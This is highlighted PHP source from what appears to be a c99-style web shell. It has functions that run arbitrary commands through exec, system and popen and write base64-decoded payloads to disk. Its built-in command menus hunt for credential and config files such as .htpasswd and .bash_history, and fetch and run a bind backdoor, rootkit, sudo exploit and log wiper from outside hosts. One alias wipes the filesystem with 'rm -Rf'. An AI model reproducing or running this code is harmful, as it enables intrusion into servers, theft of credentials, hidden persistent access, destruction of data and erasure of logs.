    <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="nv">$text</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$w_file</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="nx">err</span><span class="p">();</span>
     <span class="k">if</span><span class="p">(</span><span class="nv">$w_file</span><span class="p">)</span>
     <span class="p">{</span>
     <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nv">$w_file</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">));</span>
     <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w_file</span><span class="p">);</span>
     <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">cfb</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="nv">$text</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$w_file</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="nx">bberr</span><span class="p">();</span>
     <span class="k">if</span><span class="p">(</span><span class="nv">$w_file</span><span class="p">)</span>
     <span class="p">{</span>
     <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nv">$w_file</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">));</span>
     <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w_file</span><span class="p">);</span>
     <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">err</span><span class="p">()</span>
    <span class="p">{</span>
    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsge&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=red size=3&amp;gt;Error:&amp;lt;/font&amp;gt; Can&#39;t connect!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">bberr</span><span class="p">()</span>
    <span class="p">{</span>
    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsge&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=red size=3&amp;gt;Error:&amp;lt;/font&amp;gt; Can&#39;t backdoor host!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
     
     
    <span class="k">function</span> <span class="nf">ex</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">))</span>
     <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">,</span><span class="nv">$res</span><span class="p">);</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$res</span><span class="p">);</span>
       <span class="p">}</span>
      <span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">);</span>
       <span class="p">}</span>
      <span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">);</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
       <span class="p">}</span>
      <span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">);</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
       <span class="p">}</span>
      <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$cfe</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span>
      <span class="p">{</span>
       <span class="nv">$res</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
       <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$res</span> <span class="o">.=</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span> <span class="p">}</span>
       <span class="o">@</span><span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
      <span class="p">}</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">CleanDir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$d</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
        <span class="nv">$d</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$d</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">//EoW</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$surl</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$surl</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="o">.</span><span class="nv">$includestr</span><span class="p">;</span>
      <span class="nv">$surl</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$surl</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$ftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
      <span class="s2">&quot;html&quot;</span>     <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;html&quot;</span><span class="p">,</span><span class="s2">&quot;htm&quot;</span><span class="p">,</span><span class="s2">&quot;shtml&quot;</span><span class="p">),</span>
      <span class="s2">&quot;txt&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;txt&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;js&quot;</span><span class="p">,</span><span class="s2">&quot;bak&quot;</span><span class="p">,</span><span class="s2">&quot;doc&quot;</span><span class="p">,</span><span class="s2">&quot;log&quot;</span><span class="p">,</span><span class="s2">&quot;sfc&quot;</span><span class="p">,</span><span class="s2">&quot;cfg&quot;</span><span class="p">,</span><span class="s2">&quot;htaccess&quot;</span><span class="p">),</span>
      <span class="s2">&quot;exe&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;install&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;cmd&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ini&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ini&quot;</span><span class="p">,</span><span class="s2">&quot;inf&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">),</span>
      <span class="s2">&quot;code&quot;</span>     <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;phtml&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">,</span><span class="s2">&quot;inc&quot;</span><span class="p">,</span><span class="s2">&quot;tcl&quot;</span><span class="p">,</span><span class="s2">&quot;h&quot;</span><span class="p">,</span><span class="s2">&quot;c&quot;</span><span class="p">,</span><span class="s2">&quot;cpp&quot;</span><span class="p">,</span><span class="s2">&quot;py&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">,</span><span class="s2">&quot;pl&quot;</span><span class="p">),</span>
      <span class="s2">&quot;img&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;gif&quot;</span><span class="p">,</span><span class="s2">&quot;png&quot;</span><span class="p">,</span><span class="s2">&quot;jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;jfif&quot;</span><span class="p">,</span><span class="s2">&quot;jpg&quot;</span><span class="p">,</span><span class="s2">&quot;jpe&quot;</span><span class="p">,</span><span class="s2">&quot;bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ico&quot;</span><span class="p">,</span><span class="s2">&quot;tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">,</span><span class="s2">&quot;avi&quot;</span><span class="p">,</span><span class="s2">&quot;mpg&quot;</span><span class="p">,</span><span class="s2">&quot;mpeg&quot;</span><span class="p">),</span>
      <span class="s2">&quot;sdb&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
      <span class="s2">&quot;phpsess&quot;</span>  <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sess&quot;</span><span class="p">),</span>
      <span class="s2">&quot;download&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;exe&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">,</span><span class="s2">&quot;pif&quot;</span><span class="p">,</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="s2">&quot;lnk&quot;</span><span class="p">,</span><span class="s2">&quot;zip&quot;</span><span class="p">,</span><span class="s2">&quot;rar&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">,</span><span class="s2">&quot;tar&quot;</span><span class="p">)</span>
    <span class="p">);</span>
    <span class="nv">$exeftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
      <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;PHPRC&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; -q %f%&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">),</span>
      <span class="s2">&quot;perl %f%&quot;</span>                <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pl&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">)</span>
    <span class="p">);</span>
    <span class="nv">$regxp_highlight</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
      <span class="k">array</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]),</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#FFFF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.tgz$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.gz$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.tar$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.bz2$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.zip$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.rar$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php3$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php4$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.jpg$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.jpeg$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.JPG$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.JPEG$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.ico$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.gif$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.png$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.htm$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00CCFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.html$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00CCFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
      <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.txt$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C0C0C0&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">)</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;ls -al&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all suid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find suid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all sgid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find sgid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find config.inc.php files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find config* files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find config* files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders and files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders and files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type d -perm -2 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type d -perm -2 -ls&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all service.pwd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find service.pwd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .htpasswd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .htpasswd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .bash_history files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .bash_history files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .fetchmailrc files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .fetchmailrc files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;List file attributes on a Linux second extended file system&quot;</span><span class="p">,</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">)</span>
      <span class="p">);</span>
      <span class="nv">$cmdaliases2</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; extract psyBNC&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx.tgz;tar -zxf fx.tgz&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; extract EggDrop&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fxb.tgz;tar -zxf fxb.tgz&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logged in users&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Last to connect&quot;</span><span class="p">,</span><span class="s2">&quot;lastlog&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Suid bins&quot;</span><span class="p">,</span><span class="s2">&quot;find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2&amp;gt; /dev/null&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User Without Password&quot;</span><span class="p">,</span><span class="s2">&quot;cut -d: -f1,2,3 /etc/passwd | grep ::&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Can write in /etc/?&quot;</span><span class="p">,</span><span class="s2">&quot;find /etc/ -type f -perm -o+w 2&amp;gt; /dev/null&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Downloaders?&quot;</span><span class="p">,</span><span class="s2">&quot;which wget curl w3m lynx fetch lwp-download&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;CPU Info&quot;</span><span class="p">,</span><span class="s2">&quot;cat /proc/version /proc/cpuinfo&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Is gcc installed ?&quot;</span><span class="p">,</span><span class="s2">&quot;locate gcc&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Format box (DANGEROUS)&quot;</span><span class="p">,</span><span class="s2">&quot;rm -Rf&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget WIPELOGS PT1&quot;</span><span class="p">,</span><span class="s2">&quot;wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;gcc WIPELOGS PT2&quot;</span><span class="p">,</span><span class="s2">&quot;gcc zap2.c -o zap2&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Run WIPELOGS PT3&quot;</span><span class="p">,</span><span class="s2">&quot;./zap2&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget RatHole 1.2 (Linux &amp; BSD)&quot;</span><span class="p">,</span><span class="s2">&quot;wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; run BindDoor&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;bind.tgz;tar -zxvf bind.tgz;./4877&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget Sudo Exploit&quot;</span><span class="p">,</span><span class="s2">&quot;wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c&quot;</span><span class="p">),</span>
      <span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find index.php in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find *config*.php in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find c99shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">c99</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
